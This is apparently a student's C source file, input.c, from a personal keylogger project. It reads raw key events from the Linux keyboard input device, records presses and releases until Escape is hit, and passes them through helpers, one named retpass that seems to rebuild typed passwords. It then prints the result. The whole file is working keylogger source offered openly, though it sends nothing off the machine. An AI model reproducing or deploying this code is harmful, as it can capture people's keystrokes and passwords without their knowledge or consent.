/*
** input.c for keylogger in /home/azword/delivery/Perso/PSU/Keylogger/src
** 
** Made by Nathan Tréhout | Az'
** Login   <nathan.trehout@epitech.eu>
** 
** Started on  Sat Dec 31 15:07:11 2016 Nathan Trehout
** Last update Sat Dec 31 15:07:15 2016 Nathan Trehout
*/

#include "my.h"

int	main()
{
  const char *dev = "/dev/input/by-path/platform-i8042-serio-0-event-kbd";
  struct input_event ev;
  ssize_t n;
  int fd;
  int	i;
  char	**dest;
  char	*path;

  path = malloc(sizeof(char) * 1000);
  dest = malloc(sizeof(char *) * 1000);
  i = 0;
  fd = open(dev, O_RDONLY);
  if (fd == -1)
    {
      fprintf(stderr, "Cannot open %s: %s.\n", dev, strerror(errno));
      return EXIT_FAILURE;
    }
  while (i <= 300)
    {
      n = read(fd, &ev, sizeof ev);
      if (n == (ssize_t) - 1)
	{
	  if (errno == EINTR)
	    continue;
	  else
	    break;
	}
      else if (n != sizeof ev)
	{
	  errno = EIO;
	  break;
	}
      if (ev.type == EV_KEY && ev.value == 1)
	{
	  if (strcmp(convert_to_key(ev.code), "ECHAP") == 0)
	    break;
	  dest[i++] = convert_to_key(ev.code);
	  dest[i++] = " ";
	}
      if (ev.type == EV_KEY && ev.value == 0)
	{
	  dest[i++] = convert_to_key(ev.code);
	  dest[i++] = " ";
	}
    }
  dest[i] = 0;
  dest = multiple_insert(put_properly(put_space(dest)));
  path = retpass(dest);
  write(1, path, strlen(path));
  fflush(stdout);
  return EXIT_FAILURE;
}
